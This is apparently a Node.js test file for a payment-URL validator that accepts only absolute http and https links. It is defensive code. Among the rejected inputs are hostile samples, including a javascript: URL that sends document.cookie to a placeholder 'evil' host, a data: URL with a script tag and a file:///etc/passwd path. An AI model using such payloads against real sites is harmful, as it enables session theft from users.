/*
Copyright (C) 2025 QuantumNous

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.

For commercial licensing, please contact support@quantumnous.com
*/

// Run with: node --test src/helpers/validate-payment-url.test.js
// Uses Node's native test runner (node:test + node:assert/strict) so that no
// new test dependency is introduced. classic theme is plain ESM JavaScript.
import assert from 'node:assert/strict';
import { describe, test } from 'node:test';
import { isSafeHttpPaymentUrl } from './validate-payment-url.js';

describe('isSafeHttpPaymentUrl (classic)', () => {
  test('accepts absolute http URLs', () => {
    assert.equal(isSafeHttpPaymentUrl('http://example.com/pay'), true);
    assert.equal(isSafeHttpPaymentUrl('http://localhost:8080/checkout'), true);
  });

  test('accepts absolute https URLs with path and query', () => {
    assert.equal(
      isSafeHttpPaymentUrl('https://pay.example.com/c/123?session=abc'),
      true,
    );
  });

  test('accepts uppercase scheme (normalized by URL)', () => {
    assert.equal(isSafeHttpPaymentUrl('HTTPS://example.com/pay'), true);
    assert.equal(isSafeHttpPaymentUrl('HtTp://example.com/pay'), true);
  });

  test('rejects javascript: URLs', () => {
    assert.equal(isSafeHttpPaymentUrl('javascript:alert(1)'), false);
    assert.equal(
      isSafeHttpPaymentUrl('javascript:fetch("//evil/?c="+document.cookie)'),
      false,
    );
  });

  test('rejects data: URLs', () => {
    assert.equal(isSafeHttpPaymentUrl('data:text/html,<script>'), false);
  });

  test('rejects file: URLs', () => {
    assert.equal(isSafeHttpPaymentUrl('file:///etc/passwd'), false);
  });

  test('rejects ftp: URLs', () => {
    assert.equal(isSafeHttpPaymentUrl('ftp://example.com/file'), false);
  });

  test('rejects relative URLs', () => {
    assert.equal(isSafeHttpPaymentUrl('/pay/redirect'), false);
    assert.equal(isSafeHttpPaymentUrl('pay/redirect'), false);
    assert.equal(isSafeHttpPaymentUrl('./pay'), false);
    assert.equal(isSafeHttpPaymentUrl('//example.com/pay'), false);
  });

  test('rejects bare hostnames without a scheme', () => {
    assert.equal(isSafeHttpPaymentUrl('example.com'), false);
    assert.equal(isSafeHttpPaymentUrl('pay.example.com/c/123'), false);
  });

  test('rejects empty and whitespace-only strings', () => {
    assert.equal(isSafeHttpPaymentUrl(''), false);
    assert.equal(isSafeHttpPaymentUrl('   '), false);
    assert.equal(isSafeHttpPaymentUrl('\t\n'), false);
  });

  test('rejects non-URL strings', () => {
    assert.equal(isSafeHttpPaymentUrl('not a url'), false);
    assert.equal(isSafeHttpPaymentUrl('https://'), false); // host is required
  });

  test('rejects non-string values', () => {
    assert.equal(isSafeHttpPaymentUrl(undefined), false);
    assert.equal(isSafeHttpPaymentUrl(null), false);
    assert.equal(isSafeHttpPaymentUrl(123), false);
    assert.equal(isSafeHttpPaymentUrl(true), false);
    assert.equal(isSafeHttpPaymentUrl({ url: 'https://x.com' }), false);
  });

  test('trims surrounding whitespace before parsing', () => {
    assert.equal(isSafeHttpPaymentUrl('  https://example.com/pay  '), true);
    assert.equal(isSafeHttpPaymentUrl('  javascript:alert(1)  '), false);
  });
});
